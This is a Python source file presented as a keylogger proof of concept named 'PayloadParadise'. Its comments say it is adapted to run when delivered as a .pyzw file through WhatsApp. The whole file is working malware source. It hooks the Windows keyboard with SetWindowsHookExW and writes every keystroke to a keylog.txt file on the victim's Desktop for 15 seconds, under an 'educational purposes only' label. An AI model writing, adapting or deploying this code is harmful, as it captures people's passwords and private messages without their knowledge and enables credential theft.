import os
import time
import threading
import ctypes
import ctypes.wintypes

# ============================================================
# Keylogger POC - PayloadParadise
# Uses ctypes Win32 API hooks instead of pynput to work
# in the WhatsApp .pyzw execution context.
# FOR EDUCATIONAL PURPOSES ONLY.
# ============================================================

# Define the log file path
LOG_FILE = os.path.join(os.path.expanduser("~"), "Desktop", "keylog.txt")

# Win32 API constants
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104
HC_ACTION = 0

# Win32 API types
LRESULT = ctypes.c_long
ULONG_PTR = ctypes.POINTER(ctypes.c_ulong)

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

# Special key mapping (virtual key codes -> readable names)
SPECIAL_KEYS = {
    0x08: "[backspace]",
    0x09: "[tab]",
    0x0D: "[enter]",
    0x10: "[shift]",
    0x11: "[ctrl]",
    0x12: "[alt]",
    0x14: "[capslock]",
    0x1B: "[esc]",
    0x20: " ",
    0x25: "[left]",
    0x26: "[up]",
    0x27: "[right]",
    0x28: "[down]",
    0x2E: "[delete]",
    0x5B: "[win]",
    0x5C: "[win]",
    0xA0: "[lshift]",
    0xA1: "[rshift]",
    0xA2: "[lctrl]",
    0xA3: "[rctrl]",
    0xA4: "[lalt]",
    0xA5: "[ralt]",
}


class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", ctypes.wintypes.DWORD),
        ("scanCode", ctypes.wintypes.DWORD),
        ("flags", ctypes.wintypes.DWORD),
        ("time", ctypes.wintypes.DWORD),
        ("dwExtraInfo", ULONG_PTR),
    ]


# Callback type for the low-level keyboard hook
HOOKPROC = ctypes.WINFUNCTYPE(LRESULT, ctypes.c_int, ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM)


def get_key_state():
    """Check if shift/caps lock are active for proper character casing."""
    shift_pressed = (user32.GetAsyncKeyState(0x10) & 0x8000) != 0
    caps_on = (user32.GetKeyState(0x14) & 0x0001) != 0
    return shift_pressed, caps_on


def vk_to_char(vk_code):
    """Convert a virtual key code to a printable character or label."""
    # Check special keys first
    if vk_code in SPECIAL_KEYS:
        return SPECIAL_KEYS[vk_code]

    # For printable characters, use ToUnicode for proper mapping
    # (handles keyboard layouts, dead keys, etc.)
    scan_code = user32.MapVirtualKeyW(vk_code, 0)
    kbd_state = (ctypes.c_ubyte * 256)()
    user32.GetKeyboardState(kbd_state)

    buf = (ctypes.c_wchar * 4)()
    result = user32.ToUnicode(vk_code, scan_code, kbd_state, buf, len(buf), 0)

    if result > 0:
        return buf[0]

    # Fallback: return the vk code label
    return f"[vk:{vk_code}]"


def low_level_keyboard_proc(nCode, wParam, lParam):
    """Low-level keyboard hook callback."""
    if nCode == HC_ACTION and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
        kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        vk_code = kb.vkCode
        char = vk_to_char(vk_code)

        try:
            with open(LOG_FILE, 'a') as f:
                f.write(char)
        except Exception:
            pass

    return user32.CallNextHookEx(None, nCode, wParam, lParam)


# Must keep a reference to the callback to prevent garbage collection
_hook_callback = HOOKPROC(low_level_keyboard_proc)


def start_keylogger():
    """Install the low-level keyboard hook and run the message loop."""
    hook = user32.SetWindowsHookExW(
        WH_KEYBOARD_LL,
        _hook_callback,
        kernel32.GetModuleHandleW(None),
        0
    )

    if not hook:
        return

    msg = ctypes.wintypes.MSG()
    # Message pump — required for the hook to receive events
    while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
        user32.TranslateMessage(ctypes.byref(msg))
        user32.DispatchMessageW(ctypes.byref(msg))

    user32.UnhookWindowsHookEx(hook)


def time_limit_check(duration):
    """Check if the time limit is reached and exit the program."""
    start = time.time()
    while True:
        if time.time() > start + duration:
            os._exit(0)
        time.sleep(1)


if __name__ == "__main__":
    duration = 15  # seconds

    # Ensure log file exists
    os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
    with open(LOG_FILE, 'w') as f:
        pass

    timer_thread = threading.Thread(target=time_limit_check, args=(duration,), daemon=True)
    timer_thread.start()

    # Run keylogger on main thread (message pump must be on main thread)
    start_keylogger()
